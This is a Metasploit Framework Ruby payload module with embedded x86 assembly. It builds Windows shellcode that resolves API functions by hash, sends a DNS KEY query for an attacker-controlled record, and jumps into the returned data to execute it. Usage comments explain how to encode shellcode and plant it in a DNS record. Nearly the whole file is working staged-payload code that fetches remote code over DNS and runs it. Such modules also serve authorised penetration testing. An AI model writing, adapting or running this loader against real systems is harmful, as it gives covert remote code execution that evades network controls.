##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'DNS KEY Record Payload Execution',
			'Description'   => 'Performs a KEY query for a given DNS record & executes the returning payload',
			'Author'        =>
				[
					'corelanc0d3r <peter.ve[at]corelan.be>'
				],
			'License'       => MSF_LICENSE,
			'Version'       => "$Revision$",
			'Platform'      => 'win',
			'Arch'          => ARCH_X86
		))

		# EXITFUNC is not supported 
		deregister_options('EXITFUNC')

		# Register command execution options
		register_options(
			[
				OptString.new('DNSRECORD', [ true, "The DNS record to query" ]),
			], self.class)
	end

	# 
	# Usage :
	# 1. Generate the shellcode you want to execute. Make sure it does not contain \x00,\x0a or \x0d
	# 2. base64 encode the raw output, put everything on one line. 
	# Example
	# ./msfpayload windows/messagebox TEXT="You have been pwned" TITLE="Friendly message from corelanc0d3r" R |
	#    ./msfencode -b '\x00\x0a\x0d' -t raw > /tmp/msgbox.bin
	# base64 < /tmp/msgbox.bin 
	#  <put the output on one line>
	# 3. Create a DNS (public) KEY record in a zone you control and paste the base64 encoded version of the payload as public key
	# 4. Generate this payload to perform the DNS query, retrieve the payload & execute it 

	#
	# Construct the payload
	#
	def generate

		dnsname		= datastore['DNSRECORD']
		wType		= 0x0019	#DNS_TYPE_KEY
		wTypeOffset	= 0x1c
		bufferreg 	= "edi"

		#create actual payload
		payload_data = <<EOS
	cld			; clear direction flag
	call start		; start main routine
; Stephen Fewer's block_api
; block_api code (Stephen Fewer)
api_call:
	pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
	mov ebp, esp           ; Create a new stack frame
	xor edx, edx           ; Zero EDX
	mov edx, fs:[edx+48]   ; Get a pointer to the PEB
	mov edx, [edx+12]      ; Get PEB->Ldr
	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:
	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
	movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
	xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the name
	cmp al, 'a'            ; Some versions of Windows use lower case module names
	jl not_lowercase       ;
	sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	loop loop_modname      ; Loop untill we have read enough
	; We now have the module hash computed
	push edx               ; Save the current position in the module list for later
	push edi               ; Save the current module hash for later
	; Proceed to iterate the export address table, 
	mov edx, [edx+16]      ; Get this modules base address
	mov eax, [edx+60]      ; Get PE header
	add eax, edx           ; Add the modules base address
	mov eax, [eax+120]     ; Get export tables RVA
	test eax, eax          ; Test if no export address table is present
	jz get_next_mod1       ; If no EAT present, process the next module
	add eax, edx           ; Add the modules base address
	push eax               ; Save the current modules EAT
	mov ecx, [eax+24]      ; Get the number of function names  
	mov ebx, [eax+32]      ; Get the rva of the function names
	add ebx, edx           ; Add the modules base address
	; Computing the module hash + function hash
get_next_func:           ;
	jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
	dec ecx                ; Decrement the function name counter
	mov esi, [ebx+ecx*4]   ; Get rva of next module name
	add esi, edx           ; Add the modules base address
	xor edi, edi           ; Clear EDI which will store the hash of the function name
	; And compare it to the one we want
loop_funcname:           ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the ASCII function name
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
	jne loop_funcname      ; If we have not reached the null terminator, continue
	add edi, [ebp-8]       ; Add the current module hash to the function hash
	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
	jnz get_next_func      ; Go compute the next function hash if we have not found it
	; If found, fix up stack, call the function and then value else compute the next one...
	pop eax                ; Restore the current modules EAT
	mov ebx, [eax+36]      ; Get the ordinal table rva      
	add ebx, edx           ; Add the modules base address
	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
	mov ebx, [eax+28]      ; Get the function addresses table rva  
	add ebx, edx           ; Add the modules base address
	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
	add eax, edx           ; Add the modules base address to get the functions actual VA
	; We now fix up the stack and perform the call to the desired function...
finish:
	mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
	pop ebx                ; Clear off the current modules hash
	pop ebx                ; Clear off the current position in the module list
	popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
	pop ecx                ; Pop off the origional return address our caller will have pushed
	pop edx                ; Pop off the hash value our caller will have pushed
	push ecx               ; Push back the correct return value
	jmp eax                ; Jump into the required function
	; We now automagically return to the correct caller...
get_next_mod:            ;
	pop eax                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
	pop edi                ; Pop off the current (now the previous) modules hash
	pop edx                ; Restore our position in the module list
	mov edx, [edx]         ; Get the next module
	jmp next_mod     	; Process this module

; actual routine
start:
	pop ebp			; get ptr to block_api routine

;first load dnsapi.dll
load_dnsapi:
	push 0x00006970        ; Push 'dnsapi' to the stack
	push 0x61736e64        ; ...
	mov esi, esp           ; Get a pointer to 'dnsapi'
	push esp               ; Push a pointer to the 'dnsapi' string on the stack.
	push 0x0726774C        ; kernel32.dll!LoadLibraryA
	call ebp               ; LoadLibraryA( "dnsapi" )

dnsquery:
	jmp get_dnsname
get_dnsname_return:
	pop eax			; get ptr to dnsname (lpstrName)
	push esp		; prepare ppQueryResultsSet
	pop ebx			;   (put ptr to ptr to stack on stack)
	sub ebx,4
	push ebx
	push 0			; pReserved
	push ebx		; ppQueryResultsSet
	push 0			; pExtra
	push 0x48		; Options : DNS_QUERY_BYPASS_CACHE (0x08) + DNS_QUERY_NO_HOSTS_FILE (0x40)
	push #{wType}		; wType
	push eax		; lpstrName
	push 0xC99CC96A 	; dnsapi.dll!DnsQuery_A
	call ebp		; 

get_query_result:
	pop #{bufferreg}
	add #{bufferreg},#{wTypeOffset}	; get pointer to payload

allocate_memory:
	push 0x40              ; PAGE_EXECUTE_READWRITE
	push 0x1000            ; MEM_COMMIT
	push 0x1 	       ; one byte is enough
	push #{bufferreg}      ; DNS payload
	push 0xE553A458        ; kernel32.dll!VirtualAlloc
	call ebp              
	jmp #{bufferreg}

get_dnsname:
	call get_dnsname_return
	db "#{dnsname}", 0x00
EOS
		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
	end
end
